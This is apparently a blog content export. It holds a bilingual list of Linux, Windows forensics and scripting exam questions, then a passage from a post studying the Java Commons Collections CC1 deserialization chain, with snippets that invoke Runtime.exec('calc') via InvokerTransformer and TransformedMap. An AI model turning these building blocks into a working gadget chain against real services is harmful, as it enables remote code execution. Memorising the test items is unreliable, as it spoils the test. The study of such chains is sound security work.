<h1 id="76-“以下哪个命令用于在Linux系统中创建分区？"><a href="#76-“以下哪个命令用于在Linux系统中创建分区？" class="headerlink" title="76    “以下哪个命令用于在Linux系统中创建分区？"></a>76    “以下哪个命令用于在Linux系统中创建分区？</h1><p>Which of the following command is used to create partitions in the Linux system?<br>“    单选    A:gdisk /dev/sde;B:mke2fs /dev/sdb1 -t ext4;C:mount /dev/sdc1 /mnt/fs_home;D:fdisk -lu;E:lvcreate -l +200 /dev/vg00/log/vol-00</p>
<h1 id="77-“一个系统管理员要扩展运行在LVM系统中的服务器存储。以下哪个命令可以用于扩展LVM中的逻辑卷？"><a href="#77-“一个系统管理员要扩展运行在LVM系统中的服务器存储。以下哪个命令可以用于扩展LVM中的逻辑卷？" class="headerlink" title="77    “一个系统管理员要扩展运行在LVM系统中的服务器存储。以下哪个命令可以用于扩展LVM中的逻辑卷？"></a>77    “一个系统管理员要扩展运行在LVM系统中的服务器存储。以下哪个命令可以用于扩展LVM中的逻辑卷？</h1><p>A system administrator wants to expand the server storage running in LVM system.  Which command can be used to expand the logical volume in LVM?<br>“    单选    A:lvdisplay /dev/vg02/vol-01;B:lvcreate -n /dev/vg02 -l 200;C:lvextend -n /dev/vg02 -l +200;D:lvscan -l +200 /dev/vg02/vol-01;E:lvresize -l +200 /dev/vg02/vol-01</p>
<h1 id="78-“一个系统管理员编写了一个bash代码来构建一个RAID系统，如下所示，将要实现什么类型的RAID？"><a href="#78-“一个系统管理员编写了一个bash代码来构建一个RAID系统，如下所示，将要实现什么类型的RAID？" class="headerlink" title="78    “一个系统管理员编写了一个bash代码来构建一个RAID系统，如下所示，将要实现什么类型的RAID？"></a>78    “一个系统管理员编写了一个bash代码来构建一个RAID系统，如下所示，将要实现什么类型的RAID？</h1><p>A system administrator has written a bash code to build a RAID system as shown below.  What type of RAID is going to be implemented?</p>
</blockquote>
<p>| #!/bin/bash<br>| hd1=/dev/sda1<br>| hd2=/dev/sdb1<br>| hd3=/dev/sdc1<br>| hd4=/dev/sdd1<br>| mdadm —build /dev/md1 —level=1 —raid-devices=2 $hd1 $hd2<br>| mdadm —build /dev/md2 —level=1 —raid-devices=2 $hd3 $hd4<br>| mdadm —build /dev/md3 —level=0 —raid-devices=2 /dev/md2 /dev/md1<br>“    单选    “A:RAID 0;B:RAID 1;C:RAID 1+0;D:RAID 0+1;E:这个代码不起作用 (No effect)<br>“</p>
<h1 id="79-“以下是运行在LINUX服务器中的服务清单。以下哪个命令可以关闭“bluetooth-service”服务？"><a href="#79-“以下是运行在LINUX服务器中的服务清单。以下哪个命令可以关闭“bluetooth-service”服务？" class="headerlink" title="79    “以下是运行在LINUX服务器中的服务清单。以下哪个命令可以关闭“bluetooth.service”服务？"></a>79    “以下是运行在LINUX服务器中的服务清单。以下哪个命令可以关闭“bluetooth.service”服务？</h1><p>The following is a list of service running on a Linux server.  Which command can be used to turn off the Bluetooth service?</p>
<p>|● vm-production-xabonline.com<br>| State: running<br>| Jobs: 0 queued<br>| Failed: 0 units<br>| Since: Fri 2023-05-19 08:37:06 UTC; 2 months 11 days ago<br>| CGroup:<br>| ├─init.scope<br>| │ └─ 1 /sbin/init<br>| ├─system.slice<br>| │ ├─bluetooth.service<br>| │ │ └─ 737 /usr/lib/bluetooth/bluetoothd<br>| │ ├─dbus.service<br>| │ ├─docker.service<br>| │ │ └─ 853 /usr/bin/dockerd -H fd://<br>| │ ├─libvirtd.service<br>| │ │ └─ 2975 /usr/bin/libvirtd —timeout 120<br>| │ ├─polkit.service<br>| │ └─virtlogd.service<br>| │ └─ 3176 /usr/bin/virtlogd<br>| └─user.slice<br>| └─user-1000.slice<br>“    单选    A:systemctl kill bluetooth.service;B:systemctl disable bluetooth.service;C:systemctl down bluetooth.service;D:systemctl stop bluetooth.service;E:systemctl rm bluetooth.service</p>
<h1 id="80-“cron服务在LINUX系统中充当作业调度程序。它实际上是在cron表（crontab）中指定的命令行列表。现在准备启动和关闭一个Web服务器（httpd-service），如下所示："><a href="#80-“cron服务在LINUX系统中充当作业调度程序。它实际上是在cron表（crontab）中指定的命令行列表。现在准备启动和关闭一个Web服务器（httpd-service），如下所示：" class="headerlink" title="80    “cron服务在LINUX系统中充当作业调度程序。它实际上是在cron表（crontab）中指定的命令行列表。现在准备启动和关闭一个Web服务器（httpd.service），如下所示："></a>80    “cron服务在LINUX系统中充当作业调度程序。它实际上是在cron表（crontab）中指定的命令行列表。现在准备启动和关闭一个Web服务器（httpd.service），如下所示：</h1><p>The Cron service acts as a job scheduler in the Linux system.  It is actually a list of commands specified in the cron table (crontab).  Now, the plan is to start and stop a web server (httpd.service) as below</p>
<p>上午8时30分（启动）- 下午6时06分（关闭）；周一至周五<br>AM 0830 (start) - PM 0606 (Closed) ; Monday to Friday</p>
<p>以下哪个crontab设置适用于这种情况？<br>Which of the following crontab setting can be used in this situation ?<br>“    单选    A:30 8 <em> 1-5 </em> /usr/bin/systemctl start httpd.service 及 06 18 <em> 1-5 </em> /usr/bin/systemctl stop httpd.service;B:30 8 <em> </em> 1-5 /usr/bin/systemctl start httpd.service 及 06 18 <em> </em> 1-5 /usr/bin/systemctl stop httpd.service;C:30 8 1-5 <em> </em>/usr/bin/systemctl start httpd.service 及 06 18 1-5 <em> </em>/usr/bin/systemctl stop httpd.service ;D:30 8 <em> </em> <em> /usr/bin/systemctl start httpd.service 及 06 18 </em> <em> </em> /usr/bin/systemctl stop httpd.service;E:以上都不是</p>
<h1 id="81-“以下哪个Linux命令可以显示目录中的所有文件，包括隐藏文件？"><a href="#81-“以下哪个Linux命令可以显示目录中的所有文件，包括隐藏文件？" class="headerlink" title="81    “以下哪个Linux命令可以显示目录中的所有文件，包括隐藏文件？"></a>81    “以下哪个Linux命令可以显示目录中的所有文件，包括隐藏文件？</h1><p>Which of the following Linux command is able to show all files in a directory, including hidden file?<br>“    单选     A. ls -ls; B. ls -asl;C. ls -lAs | wc;D. ls -als | grep ssh;E. None</p>
<h1 id="82-“如果您想要检查Linux系统上可用的剩余磁盘空间量，您会使用以下哪个命令？"><a href="#82-“如果您想要检查Linux系统上可用的剩余磁盘空间量，您会使用以下哪个命令？" class="headerlink" title="82    “如果您想要检查Linux系统上可用的剩余磁盘空间量，您会使用以下哪个命令？"></a>82    “如果您想要检查Linux系统上可用的剩余磁盘空间量，您会使用以下哪个命令？</h1><p>If you want to check the amount of free disk space available on a Linux System, you will use which of the following command?<br>“    单选     A.  df -vh;B. df -sh;C. dl -vh;D. dd -sh;E. dt -vh</p>
<h1 id="83-“Dockerfile是一个文本文档，用于在Docker架构中生成以下哪个组件？"><a href="#83-“Dockerfile是一个文本文档，用于在Docker架构中生成以下哪个组件？" class="headerlink" title="83    “Dockerfile是一个文本文档，用于在Docker架构中生成以下哪个组件？"></a>83    “Dockerfile是一个文本文档，用于在Docker架构中生成以下哪个组件？</h1><p>Dockerfile is a text document that aims to produce which of the following component in docker architecture?<br>“    单选    A. docker engine;B. image;C. container;D. volumes;E. docker network</p>
<h1 id="84-“在Linux系统中，运行中程序的进程并位于内存区域，可以通过检查文件-proc-pid-maps来显示这些内存区域。以下哪个不是Linux系统中的内存区？"><a href="#84-“在Linux系统中，运行中程序的进程并位于内存区域，可以通过检查文件-proc-pid-maps来显示这些内存区域。以下哪个不是Linux系统中的内存区？" class="headerlink" title="84    “在Linux系统中，运行中程序的进程并位于内存区域，可以通过检查文件/proc/[pid]/maps来显示这些内存区域。以下哪个不是Linux系统中的内存区？"></a>84    “在Linux系统中，运行中程序的进程并位于内存区域，可以通过检查文件/proc/[pid]/maps来显示这些内存区域。以下哪个不是Linux系统中的内存区？</h1><p>In Linux system, process is an instance of a running program located in several memory regions that can be revealed by inspecting file /proc/[pid]/maps.  Which of the following is not the memory region working in Linux system?<br>“    单选     A. [heap];B. [stack];C. [paging];D. [vvar];E. [vdso]</p>
<h1 id="85-“-以下命令中，哪个命令可以对””export-logs””输出进行排序"><a href="#85-“-以下命令中，哪个命令可以对””export-logs””输出进行排序" class="headerlink" title="85    “ 以下命令中，哪个命令可以对””export-logs””输出进行排序?"></a>85    “ 以下命令中，哪个命令可以对””export-logs””输出进行排序?</h1><p>Which of the following command can be used to sort the results of export-logs?”    单选    A:export-logs<sort;B:export-logs>sort;C:export-logs&sort;D:export-logs|sort;E:export-logs&lt;&gt;sort</p>
<h1 id="86-“哪些文件会影响Linux主机的名称解析功能？-多选题"><a href="#86-“哪些文件会影响Linux主机的名称解析功能？-多选题" class="headerlink" title="86    “哪些文件会影响Linux主机的名称解析功能？(多选题)"></a>86    “哪些文件会影响Linux主机的名称解析功能？(多选题)</h1><p>Which files will affect the name resolution function of a Linux host?<br>“    多选    A:/etc/resolv.conf;B:/etc/hosts;C:/etc/default/names;D:/etc/nsswitch.conf;E:/etc/inet/hosts</p>
<h1 id="87-“哪个系统文件包含了一般的端口、关联的服务和协议？"><a href="#87-“哪个系统文件包含了一般的端口、关联的服务和协议？" class="headerlink" title="87    “哪个系统文件包含了一般的端口、关联的服务和协议？"></a>87    “哪个系统文件包含了一般的端口、关联的服务和协议？</h1><p>Which file include the well known ports, associated services and protocol?<br>“    单选    A:/etc/services;B:/etc/sysconfig/network-scripts;C:/etc/services.conf;D:/etc/inet/hosts;E:Noneofthechoices</p>
<h1 id="88-“参考’-Windows-10-‘-文件夹回答以下题目"><a href="#88-“参考’-Windows-10-‘-文件夹回答以下题目" class="headerlink" title="88    “参考’ Windows 10 ‘ 文件夹回答以下题目"></a>88    “参考’ Windows 10 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 10 ‘ folder to answer below question</p>
<p>在 Windows 10 中 \Users\qqqqq\Downloads，视频文件(mixkit-two-women-laying-together-925-medium.mp4)，在MFT 中分成多少个Data Cluster 储存？<br>n Windows 10, the video file “”mixkit-two-women-laying-together-925-medium.mp4”” located at \Users\qqqqq\Downloads is stored in the Master File Table (MFT) using a series of data clusters. The exact number of data clusters used to store the file in the MFT is?</p>
<p>提示: 请以阿拉伯数字作答<br>Tips: Please answer in arabic numbers”    填空    </p>
<h1 id="89-“参考’-Windows-10-‘-文件夹回答以下题目"><a href="#89-“参考’-Windows-10-‘-文件夹回答以下题目" class="headerlink" title="89    “参考’ Windows 10 ‘ 文件夹回答以下题目"></a>89    “参考’ Windows 10 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 10 ‘ folder to answer below question</p>
<p>在 Windows 10 中 \Users\qqqqq\Downloads\ mixkit-two-woman-laying-together-925-medium.mp4 的last Access 时间是多少?</p>
<p>In Windows 10, what is the last Access time of the file ‘ mixkit-two-woman-laying-together-925-medium.mp4 ‘ located in ‘ \Users\qqqqq\Downloads ‘ ?”    单选    A. 2023/07/10 18:31:32;B. 2023/07/10 18:31:01;C. 2023/07/10 19:31:22;D. 2023/07/11 19:31:22</p>
<h1 id="90-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#90-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="90    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>90    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7 中 \Users\Allen\Desktop，有1个MP3 文件 (例:unlock-me-149058.mp3)，用户使用什么程序打开该MP3 文件? </p>
<p>In Windows 7, there is 1 MP3 file (unlock-me-149058.mp3) saved under the path ‘ \Users\Allen\Desktop. What program did the user use to open the mp3 file.</p>
<p>提示:请以小写字母作答<br>Tips: Please answer in lowercase letters.”    填空    </p>
<h1 id="91-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#91-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="91    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>91    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7 中 ‘ \Users\Allen\Desktop ‘有1个MP3 文件 (unlock-me-149058.mp3)，该文件的Zone identiflier为’3’。上述’3’字代表哪一个security Zone ?</p>
<p>In Windows 7, there is one MP3 file (unlock-me-149058.mp3) saved under the path ‘ \Users\Allen\Desktop.  The zone identiflier of above file is ‘3’.  What security zone does ‘3’ represent?”    单选    A. Local Machine Zone;B. Internet Zone;C. Restricted Zone;D. Trust Site Zone</p>
<h1 id="92-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#92-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="92    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>92    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7 中 \Users\Allen\Desktop有1个MP3 文件 (unlock-me-149058.mp3)，该文件从哪个网站下载?<br>In Windows 7, there is a MP3 file (unlock-me-149058.mp3) saved under the path ‘ \Users\Allen\Desktop. Which website was used to download the file?”    单选    A. www.Pixbay.com;B. free-mp3-download.net/;C. <a href="https://mp3juices.nu;D">https://mp3juices.nu;D</a>. mygomp3.com</p>
<h1 id="93-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#93-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="93    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>93    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7 中 \Users\Allen\Downloads 内有mp3文件 (miracle.mp3), 更改名称时间?<br>In Windows 7, there is a MP3 file named “”miracle.mp3 saved under the path ‘ \Users\Allen\Downloads.”” When was the file’s name changed?”    单选    A. 2023-07-13 02:55:20;B. 2023-07-15 10:55:20;C. 2023-07-12 10:58:04;D. 2023-07-13 10:55:20</p>
<h1 id="94-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#94-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="94    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>94    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7 中 \Users\Allen\Downloads 内有mp3文件 (miracle.mp3), mp3文件更改名称前的名称是什么?<br>In Windows 7, there is an MP3 file named “”miracle.mp3 saved under the path ‘  \Users\Allen\Downloads.”” What was the name of the MP3 file before it was renamed?</p>
<p>提示: 请以与记录相同的名称与文件格式作答<br>Tips: Please answer the exact name and file extension of the file”    填空    </p>
<h1 id="95-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#95-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="95    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>95    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7中有多少个文件曾被potplayer 播放?<br>In Windows 7, how many files have been played by potplayer?”    单选    A. 7;B. 8;C. 9;D. 10</p>
<h1 id="96-“参考’-Windows-7-‘-文件夹回答以下题目"><a href="#96-“参考’-Windows-7-‘-文件夹回答以下题目" class="headerlink" title="96    “参考’ Windows 7 ‘ 文件夹回答以下题目"></a>96    “参考’ Windows 7 ‘ 文件夹回答以下题目</h1><p>With reference to ‘ Windows 7 ‘ folder to answer below question</p>
<p>在 Windows 7中, potplayer最后播放的文件名?<br> In Windows 7, what is the name of the file name of last file played by PotPlayer?</p>
<p>提示: 请以与记录相同的名称(包括小写字母、阿拉伯数字与符号)与文件格式作答<br>Tips: Please answer the exact name (including lowercase letters, arabic numbers and symbols) and file extension of the file”    填空    </p>
<h1 id="97-“事件应急小组-IR-team-正在处理一起网络事件。-调查显示，目标服务器是一个-EC2-Linux-实例，与该事件有关。"><a href="#97-“事件应急小组-IR-team-正在处理一起网络事件。-调查显示，目标服务器是一个-EC2-Linux-实例，与该事件有关。" class="headerlink" title="97    “事件应急小组 ( IR team)正在处理一起网络事件。 调查显示，目标服务器是一个 EC2 Linux 实例，与该事件有关。"></a>97    “事件应急小组 ( IR team)正在处理一起网络事件。 调查显示，目标服务器是一个 EC2 Linux 实例，与该事件有关。</h1><p>该团队打算获取Linux系统的内存（使用SHA256）。 与该事件关联的 AWS 账户以用户名“duckman”注册。 为了促进内存获取过程，该团队建立了专用的“取证服务器”。 并使用“LiME”通过网络获取内存。</p>
<p>以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤?</p>
<p>The incident response team was handling a cyber incident.  The investigation revealed that the target server, an EC2 Linux instance, was implicated in the incident.  </p>
<p>The team intends to obtain the memory of the Linux system (with SHA256).  The AWS account associated with the incident is registered under the username “”duckman.””  To facilitate the memory acquisition process, the team has established a dedicated “”forensic server.”” and use “LiME” to acquire memory via network.</p>
<p>Which of the following command is the early step to config the “forensic server” for the memory acquisition?</p>
<p>“    单选    “A. nc -l 4444 &gt;mem126.lime.gz;B. Insmod lime.ko “pathtcp:4444 format=lime digest=sha256 compress=1”;C. scp -I ~/DFIRSciAWTest.pem lime.ko ec2-duckman@3.137.169.127:~/<br>scp -I ~/DFIRSciAWTest.pem /usr/bin/nc ec2-duckman@3.137.169.127:~/;D. ssh duckman@<target_server_ip> “”sudo dd if=/dev/mem | gzip -1 -“” &gt; memory_dump.gz”</p>
<h1 id="98-“基于两个-SQLite-数据库文件“cus-202308102034-json”和“date-202308101120-json”。"><a href="#98-“基于两个-SQLite-数据库文件“cus-202308102034-json”和“date-202308101120-json”。" class="headerlink" title="98    “基于两个 SQLite 数据库文件“cus_202308102034.json”和“date_202308101120.json”。"></a>98    “基于两个 SQLite 数据库文件“cus_202308102034.json”和“date_202308101120.json”。</h1><p>请编译一个 SQLite 脚本找出谁前往目的地“莫斯科””.</p>
<p>包括</p>
<ul>
<li>所有客户的姓名、</li>
<li>目的地、</li>
<li>“arrival_timestamp_HK”[将时间戳转换为本地时间并将该列命名为“local_time”]。</li>
</ul>
<p>Based on the two SQLite Database Files “cus_202308102034.json” and “”date_202308101120.json””.</p>
<p>please compile an SQLite statement to find out who traveled to the destination “Moscow”, with all customers name, destination, “arrival_timestamp_HK” [convert the timestamp to localtime and name the column as “local_time”].<br>“    单选    “A. SELECT c.customer_name, c.destination, datetime(d.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk<br>FROM cus c<br>INNER JOIN date d ON c.destination = d.Destination<br>WHERE c.destination = ‘Moscow’;B.<br>SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk<br>FROM cus<br>INNER JOIN date ON customer_id  = date.id<br>WHERE cus.destination = ‘Moscow’<br>  AND date.Destination = ‘Moscow’<br>  AND date.arrival_timestamp_HK IS NOT NULL<br>  AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’);C. SELECT cus.customer_name, cus.destination, date.arrival_timestamp<br>FROM cus<br>INNER JOIN date ON cus.destination = date.destination;<br>WHERE cus.destination = ‘Moscow’<br>  AND date.Destination = ‘Moscow’;D. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk<br>FROM cus<br>INNER JOIN date ON cus.destination  = date.Destination<br>WHERE cus.destination = ‘Moscow’<br>  AND date.Destination = ‘Moscow’<br>  AND date.arrival_timestamp_HK IS NOT NULL<br>  AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’)”</p>
<h1 id="99-“写一个Powershell的脚本以提取正在连接到Window-11计算机的可移动设备的记录。就每一个装置记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号。及后用-“Write-Host”-指令题示数据。"><a href="#99-“写一个Powershell的脚本以提取正在连接到Window-11计算机的可移动设备的记录。就每一个装置记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号。及后用-“Write-Host”-指令题示数据。" class="headerlink" title="99    “写一个Powershell的脚本以提取正在连接到Window 11计算机的可移动设备的记录。就每一个装置记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号。及后用 “Write-Host” 指令题示数据。"></a>99    “写一个Powershell的脚本以提取正在连接到Window 11计算机的可移动设备的记录。就每一个装置记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号。及后用 “Write-Host” 指令题示数据。</h1><p>write a PowerShell script to retrieve all removable device records connected to a Windows 11 desktop, for each device record, extracts relevant information such as the device name, manufacturer, description, and hardware ID.  Then, use the “Write-Host” cmdlet to displays such information.</p>
<p>“    填空    </p>
<h1 id="100-“以下-PowerShell-脚本用于从-Windows-Server-2012-R2-获取具有管理员权限的所有使用者活动。"><a href="#100-“以下-PowerShell-脚本用于从-Windows-Server-2012-R2-获取具有管理员权限的所有使用者活动。" class="headerlink" title="100    “以下 PowerShell 脚本用于从 Windows Server 2012 R2 获取具有管理员权限的所有使用者活动。"></a>100    “以下 PowerShell 脚本用于从 Windows Server 2012 R2 获取具有管理员权限的所有使用者活动。</h1><p>The following PowerShell script is used to retrieve all user activities with admin rights from a Windows Server 2012 R2.</p>
<p>Get-WinEvent -FilterHashtable @{<br>    LogName = ‘Security’<br>    ID = 4688<br>    Level = 0<br>} | Where-Object {+B86<br>    $_.Properties[?].Value -match ‘S-1-5-21-\d+-500’<br>} | Select-Object -Property TimeCreated, Message</p>
<p>使用 “”Where-Object”” 命令来进一步过滤事件。<br>事件的属性 “”$_.Properties[?]”” 中的参数是什么？<br>如果事件的第 9 个属性与内建的 Administrator 账户的安全标识符（SID：S-1-5-21-<domain>-500）匹配，则确保只选择与管理员活动相关的事件。</p>
<p>The “Where-Object” cmdlet is used to filter the events further.<br>What is parameter of the event’s property “$_.Properties[?]”?<br>if the event’s 9th property matches the security identifier (SID) of the built-in Administrator account (SID: S-1-5-21-<domain>-500).  This ensures that only events related to activities by an administrator are selected.<br>“    填空    </p>
]]></content>
  </entry>
  <entry>
    <title>CC链</title>
    <url>/2024/09/25/CC%E9%93%BE/</url>
    <content><![CDATA[<h1 id="文章首发于freebufjava反序列化CC1-CC7的调试解析"><a href="#文章首发于freebufjava反序列化CC1-CC7的调试解析" class="headerlink" title="文章首发于freebufjava反序列化CC1-CC7的调试解析"></a>文章首发于freebuf<a href="https://www.freebuf.com/articles/web/412973.html">java反序列化CC1-CC7的调试解析</a></h1><h1 id="这篇文章用于记录我学习cc链的过程，这几天打了一下校赛，说实话打的不咋地，我和队友发挥都不大行，有种白学这么久的美，KP杯里有道CC2的题，说实话打比赛的时候我只是刚开始学cc1，也没完全理解，现在OK了。"><a href="#这篇文章用于记录我学习cc链的过程，这几天打了一下校赛，说实话打的不咋地，我和队友发挥都不大行，有种白学这么久的美，KP杯里有道CC2的题，说实话打比赛的时候我只是刚开始学cc1，也没完全理解，现在OK了。" class="headerlink" title="这篇文章用于记录我学习cc链的过程，这几天打了一下校赛，说实话打的不咋地，我和队友发挥都不大行，有种白学这么久的美，KP杯里有道CC2的题，说实话打比赛的时候我只是刚开始学cc1，也没完全理解，现在OK了。"></a>这篇文章用于记录我学习cc链的过程，这几天打了一下校赛，说实话打的不咋地，我和队友发挥都不大行，有种白学这么久的美，KP杯里有道CC2的题，说实话打比赛的时候我只是刚开始学cc1，也没完全理解，现在OK了。</h1><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>先来聊一下CC1吧。<br>首先我们想要命令执行就需要找到一个恶意方法。也就是如下的类方法</p>
<img src="/2024/09/25/CC%E9%93%BE/CC1_1.png" class="" title="alt text">
<p>我们可以看到InvokerTransformer中的transformer方法进行了一个反射调用<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> O <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><br>可以发现其调用了method.invoke(input, this.iArgs);那么我们就可以利用这个transform来进行命令执行<br>通过构造方法我们可以直到其iMethodName,iParamTypes,iArgs是怎么传入的<br><img src="/2024/09/25/CC%E9%93%BE/CC1_2.png" class="" title="alt text"><br>可以发现我们其构造方法是public的那么我们就可以通过如下方式来构造命令执行<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DDEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们需要从transform这个方法来寻找其他调用了该方法的类，以此来跳道其他的类中<br><img src="/2024/09/25/CC%E9%93%BE/CC1_4.png" class="" title="alt text"><br>我们寻找调用了transform的类发现了TransformedMap的cheakSetValue<br><img src="/2024/09/25/CC%E9%93%BE/CC1_5.png" class="" title="alt text"><br>继续寻找可以找到AbstractInputCheckedMapDecorator的setvalue<br>我们先找到这里，我们要查看一下这个setvalue是如何触发的<br>setvalue这个方法其实经常用在遍历Map方法中如下代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry entry:map.entrySet())</span><br><span class="line">        &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br>上面的代码就是一个遍历map中的setValue方法，而这样就会跳到map的cheakSetValue<br><img src="/2024/09/25/CC%E9%93%BE/CC1_10.png" class="" title="alt text"><br>我们可以发现这个TransformedMap类是继承于另一个AbstractInputCheckedMapDecorator类我们一步步的步入会发现最终继承的一个类是Map类<br><img src="/2024/09/25/CC%E9%93%BE/CC1_11.png" class="" title="alt text"><br>即这个TransformedMap其实就是一个Map类那么我们就可以遍历这个TransformedMap来setvalue从而调用这个TransformedMap的cheakSetvalue而后调用transform<br>即我们可以通过如下方法来尝试进行命令执行<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())</span><br><span class="line">    &#123;</span><br><span class="line">        entry.setValue(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>而后我们再查看setValue的调用位置<br><img src="/2024/09/25/CC%E9%93%BE/CC1_6.png" class="" title="alt text"><br>我们可以找到一个readObject的一个方法下调用了setValue方法<br><img src="/2024/09/25/CC%E9%93%BE/CC1_7.png" class="" title="alt text"><br>那么我们的链子其实就已经找全了。如下<br><img src="/2024/09/25/CC%E9%93%BE/CC1_12.png" class="" title="alt text"><br>虽然AnnotationInvocationHandler不是公共类但是我们可以反射调用它,AnnotationInvocationHandler构造函数的参数时一个注解类和一个Map，这个注解类其实就是我们重写时的<code>@Override</code>之类的。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor=clazz.getConstructor(Class.class,Map.class);</span><br><span class="line">Object instance=constructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><br>但是我们现在还有两个问题没有解决，一个是Runtime这个类并没有继承Serializable接口，我们无法将其反序列化，另一个是我们可以发现AnnotationInvocationHandler中调用setValue其传入setValue的值是不可控的是写死的，这就导致我们无法再setValue里传入Runtime来进行命令执行</p>
